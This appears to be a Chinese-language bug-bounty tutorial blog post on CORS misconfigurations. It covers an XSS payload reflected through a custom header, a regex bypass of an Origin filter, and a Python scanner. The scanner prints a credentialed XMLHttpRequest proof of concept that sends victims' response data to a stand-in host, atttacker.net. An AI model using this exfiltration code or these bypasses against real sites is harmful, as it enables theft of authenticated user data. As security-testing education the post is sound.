---
layout: post
title: BugBounty基础 - CORS
---

## 介绍
---

关于CORS的过多介绍这里不再赘述，以下文章很清楚的描写了相关信息:

> 通过访问攻击者部署的网站，请求目标服务器，从而跨域访问受害者的相关资源

[Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

[Advanced CORS Exploitation Techniques](https://corben.io/blog/18-6-16-advanced-cors-techniques)


## 深入理解
---

### 在无COOKIE和认证时进行客户端缓存投毒(Client-Side cache poisoning)

> 此情况网站会将指定的**自定义** http头用作回显

```
GET / HTTP/1.1  
Host: example.com  
X-User-id: <svg/onload=alert(1)>  
  
HTTP/1.1 200 OK  
Access-Control-Allow-Origin: *  
Access-Control-Allow-Headers: X-User-id  
Content-Type: text/html  
...  
Invalid user: <svg/onload=alert(1)>
```


### 一种对Origin头过滤的案例及绕过

```json
SetEnvIf Origin "^https?:\/\/(.*\.)?xxe.sh([^\.\-a-zA-Z0-9]+.*)?" AccessControlAllowOrigin=$0Header set Access-Control-Allow-Origin %{AccessControlAllowOrigin}e env=AccessControlAllowOrigin
```

```
[^\.\-a-zA-Z0-9] = does not match these characters: "." "-" "a-z" "A-Z" "0-9"+ = a quantifier, matches above chars one or unlimited times (greedy).* = any character(s) except for line terminators
```

> 从 xxe.sh阻止所有子域和这些域上的任何端口进行跨域访问

使用空格进行绕过 `. - a-z A-Z 0-9` 正则匹配

```
Origin: 'http://xxx.xxe.sh .payload'
```

随后修改hosts文件

```
127.0.0.1 xxx.xxe.sh_.payload
```

## 代码实现
---

既然知道了能够通过 `Access-Control-Allow-Origin` 和 `Access-Control-Allow-Credentials` 验证是否存在CORS，以及了解了相关的绕过方法和触发方法，那么做一个简单的扫描器也轻而易举:

```python
#python3

import requests
import re
import sys

if len(sys.argv) < 2:
    print("requires a url parameter.")
    sys.exit(0)
else:
    url = sys.argv[1]

def CheckCORS(url):
    domain = re.search(r"https?://([\w.-]+)/", url)
    domain = domain.group(1)
    payload = ['https://'+domain+'.test.com','http://'+domain+'.test.com','https://'+domain+' .test.com','https://'+domain+'_.test.com','null','https://www.test.com','http://www.test.com']

    POC = """
    var req = new XMLHttpRequest();  
    req.onload = reqListener;  
    req.open('get','"""+url+"""',true);  
    req.withCredentials = true;  
    req.send();  
    function reqListener() {  
        location='//atttacker.net/log?key='+this.responseText;  
    };
    """
    
    for i in range(len(payload)):
        try:
            headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
            "Origin": payload[i]
            }
            response = requests.get(url,headers=headers)
            acao_headers = response.headers['Access-Control-Allow-Origin']
            acac_headers = response.headers['Access-Control-Allow-Credentials']
            
            if (acao_headers == payload[i] or  acao_headers == '*') and acac_headers == "true":
                print("{} has a CORS vulnerability.".format(url))
                print("try to use poc:\n {}".format(POC))
                print("change hosts file to: 127.0.0.1  {}\nand put POC HTML file in HTTP Server.".format(payload[i]))
                break
                return url
        except:
            pass

  

if __name__ == "__main__":
    CheckCORS(url)
```